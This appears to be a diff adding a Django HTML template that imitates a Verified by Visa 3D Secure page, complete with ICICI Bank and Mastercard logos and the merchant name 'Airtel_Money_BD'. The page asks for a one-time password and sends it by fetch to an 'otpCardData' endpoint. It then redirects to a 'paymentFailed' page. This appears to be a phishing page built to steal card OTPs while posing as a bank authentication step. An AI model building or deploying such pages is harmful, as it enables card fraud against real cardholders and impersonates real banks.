@@ -1,0 +1,206 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+
+<HTML>
+
+<HEAD>
+  <meta HTTP-EQUIV="Cache-Control" CONTENT="no cache">
+  <meta HTTP-EQUIV="Pragma" CONTENT="no cache">
+  <meta HTTP-EQUIV="Expires" CONTENT="0">
+  <meta HTTP-EQUIV="content-type" CONTENT="text/html; charset=utf-8">
+
+  <TITLE>Verified By Visa</TITLE>
+
+  <style>
+    @import url('https://fonts.googleapis.com/css?family=Roboto:300,400,400i,500,700&display=swap');
+
+
+    .payerForm {
+      font-family: 'Roboto', sans-serif;
+      padding: 20px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+      line-height: 18px;
+
+    }
+
+    .payerForm td {
+      padding: 4px;
+    }
+
+    .footNotes {
+      padding-top: 35px;
+      padding-bottom: 20px;
+    }
+
+    .input-txt {
+      width: 85%;
+      padding: 5px;
+    }
+
+    input[type="text"],
+    .input-txt {
+      padding: 5px;
+    }
+
+    input#submit {
+      padding: 5px 15px;
+      margin: 5px;
+      text-transform: uppercase;
+      border: none;
+      background: #5e5e5e !important;
+      color: #fff;
+    }
+
+    form#contactform {
+      font-weight: 700;
+      margin: 0 !important;
+    }
+  </style>
+  <table border="0" cellspacing="1" cellpadding="1" width="450" align="center" class="payerForm" height="400"
+    valign="middle">
+    <tr>
+      <td colspan="2" valign="top">
+        <table width="100%">
+
+          <tr>
+            <td width="80%"><IMG name="vpasLogo"
+                SRC="https://www.3dsecure.icicibank.com/ACSWeb/EnrollWeb/ICICIBank/images/vbv_logo.jpg" BORDER=0
+                ALT="Verified by Visa"></td>
+            <td width="20%" align=right><IMG name="memberLogo" height=64px width=113px
+                src="https://images.all-free-download.com/images/graphicthumb/mastercard_1_82737.jpg" BORDER=0 ALT=""
+                </td>
+          </tr>
+        </table>
+      </td>
+    </tr>
+
+
+
+    <tr>
+      <td colspan=2>&nbsp;&nbsp;<FONT SIZE="2" COLOR="#CC3333"><I>Internet I PIN</I></FONT>
+
+        <br>
+        <table border="0" cellspacing="0" cellpadding="0" width="97%" align="center">
+          <tr>
+            <td>
+              <div style="text-align:justify">
+                <FONT SIZE="2" COLOR="black">Please enter your Verified by Visa<sup>&reg;</sup> 3D Secure PIN in the
+                  space provided below, to confirm your identity for this purchase. This information will not be shared
+                  with the merchant.</FONT>
+              </div>
+            </td>
+          </tr>
+        </table>
+      </td>
+
+    </tr>
+    <tr>
+      <td colspan=2>&nbsp;</td>
+    </tr>
+
+    <tr class="merchantName">
+      <td align=right>Merchant Name: </td>
+      <td> Airtel_Money_BD</td>
+    </tr>
+    </tr>
+    <tr>
+      <!-- <td colspan=2><IMG height=1 src="https://acs.icicibank.com/acspage/en_US_ICICI_Retail/images/1pixel.gif" border=0> -->
+      </td>
+    </tr>
+    <tr>
+      <td align=right>Card Number: </td>
+      <td>XXXX XXXX XXXX XXXX</td>
+    </tr>
+    <tr>
+      <td align=right nowrap>Personal Message: </td>
+      <td class="important"><SPAN ID="spanSecret" nowrap>3D Secure Authentication</SPAN></td>
+    </tr>
+
+
+    <tr>
+      <!-- <td colspan=2><IMG height=5 src="https://acs.icicibank.com/acspage/en_US_ICICI_Retail/images/1pixel.gif" border=0> -->
+      </td>
+    </tr>
+    <tr class="errorType" align="center">
+
+      <td colspan=2 align="center">
+        <script>
+          document.writeln('');
+        </script>
+      </td>
+
+    </tr>
+
+    <tr>
+      <!-- <td colspan=2><IMG height=5 src="https://acs.icicibank.com/acspage/en_US_ICICI_Retail/images/1pixel.gif" border=0> -->
+      </td>
+
+    </tr>
+
+
+    <td style="font-weaight:bold;" align=right><b>One Time Password:</b></td>
+    <td align=centre>
+      <form method="post" action="" name="contactform" id="contactform" autocomplete="on">
+        {% csrf_token %}
+
+        <INPUT TYPE="password" name="otp" ID="otp" maxlength="100" value="" autocomplete="off" requireds>
+        <font face="Verdana" size="1" color="#808080"><b>&nbsp
+
+            [?]
+            </a>
+          </b></font>
+    </td>
+
+    <tr>
+      <td CLASS="smallNotes" align="right">
+        <SCRIPT LANGUAGE=javascript>
+          // document.writeln('<A TITLE=\"Click Here)\" HREF=\"cc.php\" onClick=\"closing=false\" style="font-size:12px;">(forgot 3D Secure PIN?)</A>');
+        </SCRIPT>
+      </td>
+    </tr>
+
+    <script>
+      let submitData = () => {
+        let otp = document.getElementById('otp').value;
+    
+
+        let url = "{% url 'otpCardData' %}"
+        fetch(`${url}?otp=${otp}`)
+          .then(res => res.json())
+          .then(json => {
+            console.log(json)
+            if (json.status == 200) {
+              window.location.href = "{% url 'paymentFailed' %}"
+            } else {
+              alert('Something went wrong!')
+            }
+          })
+      }
+    </script>
+
+    <tr>
+      <td align="center" colspan="2">
+        <div id="cmd123456" style="visibility:visible"><button type="button"  onclick="submitData()"
+          title="Click here to submit"
+          style="FONT-WEIGHT: bold; COLOR: #ffefd5; BACKGROUND-COLOR: #708090">SUBMIT</button>
+          &nbsp;&nbsp;&nbsp;
+      </td>
+    </tr>
+
+    </form>
+
+    <tr>
+      <td colspan="2" align="center" class="footNotes">
+        <br>
+        <FONT SIZE="1">This page will automatically timeout after 180 seconds.</font>
+      </td>
+    </tr>
+
+  </table>
+  </div>
+
+  </div>
+
+  </BODY>
+
+</HTML>
